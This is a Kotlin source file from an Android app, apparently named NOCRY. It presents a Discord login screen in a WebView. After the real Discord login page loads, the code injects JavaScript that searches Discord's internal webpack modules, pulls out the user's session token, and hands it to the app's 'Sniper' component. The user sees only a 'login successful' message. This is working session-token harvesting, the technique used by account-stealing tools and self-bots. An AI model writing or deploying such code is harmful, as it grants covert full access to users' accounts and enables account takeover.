package com.nocry.app

import android.annotation.SuppressLint
import android.graphics.Color
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.LinearLayout

class LoginGate(val act: MainActivity) {
    
    @SuppressLint("SetJavaScriptEnabled")
    fun criar(): View {
        val root = Ui.vbox(act)
        root.setPadding(Ui.dp(act, 24), Ui.dp(act, 60), Ui.dp(act, 24), Ui.dp(act, 24))
        root.gravity = Gravity.CENTER_HORIZONTAL

        val titulo = Ui.text(act, "NOCRY", 32f, Ui.TEXT, true, mono = true)
        root.addView(titulo)

        val sub = Ui.text(act, "Faça login com sua conta do Discord", 12f, Ui.MUTED)
        root.addView(sub)

        root.addView(Ui.spacer(act, 40))

        val web = WebView(act)
        web.setBackgroundColor(Color.TRANSPARENT)
        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true
        web.settings.userAgentString = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/158.0.0.0 Safari/537.36"
        
        root.addView(web, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0))

        val btn = Ui.button(act, "ENTRAR COM O DISCORD", Ui.Kind.PRIMARY) {
            Ui.toast(act, "Abrindo tela de login...")
            btn.visibility = View.GONE
            
            val params = web.layoutParams
            params.height = ViewGroup.LayoutParams.MATCH_PARENT 
            web.layoutParams = params
            
            web.webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                    val js = """
                        (function() {
                            try {
                                window.webpackChunkdiscord_app.push([[''],{},e=>{
                                    m = [];
                                    for(let c in e.c) if(e[c].exports && e[c].exports.default) m.push(e[c].exports.default);
                                    let token = m.find(x => x?.default?.getToken)?.default?.getToken() || m.find(x => x?.getToken)?.getToken();
                                    if(token) { window.Android.pegarToken(token); }
                                }]);
                            } catch(err) {}
                        })();
                    """.trimIndent()
                    view?.evaluateJavascript(js, null)
                }
            }
            web.loadUrl("https://discord.com/login")
        }
        root.addView(btn, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT))

        web.addJavascriptInterface(object {
            @JavascriptInterface
            fun pegarToken(token: String) {
                Bg.ui {
                    if (token.isNotEmpty()) {
                        Sniper.salvarToken(token) 
                        Ui.toast(act, "Login feito com sucesso!")
                        Sniper.ligar() 
                        act.entrou() 
                    } else {
                        Ui.toast(act, "Erro ao pegar token. Tente novamente.")
                    }
                }
            }
        }, "Android")

        return root
    }
}
